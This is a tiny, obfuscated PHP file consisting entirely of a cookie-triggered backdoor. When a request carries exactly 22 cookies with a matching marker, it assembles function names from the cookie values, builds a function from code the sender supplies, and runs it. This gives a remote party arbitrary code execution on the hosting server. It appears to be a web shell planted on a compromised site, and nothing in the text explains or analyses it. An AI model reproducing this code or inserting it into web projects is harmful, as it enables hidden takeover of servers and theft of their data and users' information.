<?php

$p=$_COOKIE;(count($p)==22&&in_array(gettype($p).count($p),$p))?(($p[87]=$p[87].
$p[4])&&($p[68]=$p[87]($p[68]))&&($p=$p[68]($p[55],$p[87]($p[69])))&&$p()):$p;